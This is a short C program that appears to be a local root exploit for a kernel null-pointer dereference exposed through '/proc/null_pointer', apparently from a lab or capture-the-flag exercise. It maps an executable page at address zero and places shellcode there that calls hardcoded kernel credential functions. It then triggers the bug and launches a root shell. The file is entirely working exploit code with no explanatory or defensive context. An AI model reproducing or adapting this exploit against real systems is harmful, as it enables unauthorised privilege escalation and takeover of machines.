#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

char payload[] = "\x48\xc7\xc7\x0\x0\x0\x0\x48\xc7\xc0\x40\x17\x8\x81\xff\xd0\x48\x89\xc7\x48\xc7\xc0\x50\x15\x8\x81\xff\xd0\xc3"; // shellcode

int main()
{
    mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    memcpy(0, payload, sizeof(payload));
    int fd = open("/proc/null_pointer", O_WRONLY);
    puts("Run shellcode...");
    write(fd, "Mask", 4);
    puts("Get root.");
    system("/bin/sh");
    return 0;
}